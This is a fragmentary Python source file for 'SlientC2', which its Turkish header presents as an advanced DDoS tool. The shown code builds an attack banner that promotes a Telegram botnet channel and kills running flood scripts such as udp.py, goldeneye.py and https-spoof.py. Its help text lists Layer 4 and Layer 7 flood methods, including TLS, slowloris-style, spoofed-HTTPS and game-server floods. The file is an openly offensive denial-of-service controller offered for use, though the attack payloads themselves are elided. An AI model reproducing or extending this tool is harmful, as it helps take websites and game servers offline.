#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# SlientC2 – Gelişmiş DDoS Aracı (Tüm hatalar düzeltildi + FIVEM + BROWSER + MINECRAFT-GO)
...
def show_attack_banner(target, port, duration, method, threads=None, vip=True, expiry=864.70, cooldown=0.00):
    ...
    print(gradient_text(pad + "║" + left("  Join: t.me/slientbotnet") + "║"))
    print(gradient_text(pad + "╚" + border + "╝"))
        ...
        if result.stdout:
            for pid in result.stdout.strip().split('\n'):
                try:
                    ...
                    pass
        # Python
        result = subprocess.run(["pgrep", "-f", "udp.py|cf-pro.py|goldeneye.py|https-spoof.py|fortnite.py|icmp.py|minecraft.py"], capture_output=True, text=True)
        if result.stdout:
            for pid in result.stdout.strip().split('\n'):
                try:
                    os.kill(int(pid), signal.SIGTERM)
...
def cmd_help():
    ...
    for line in help_lines:
        print(gradient_text(pad + line))
    print(gradient_text(pad + " " * 4 + "Örnek: L7, Layer7, L4, Layer4, GAME, udp, httpflood, cfpro, flood, http-raw, http-socket, http-rand, https-spoof, tls, tls2, tls3, httpflood2, slow, tcpflood, fortnite, fivem, browser, minecraft, saldırı_goster, saldırı_kapan, theme, clear, history, stop\n"))
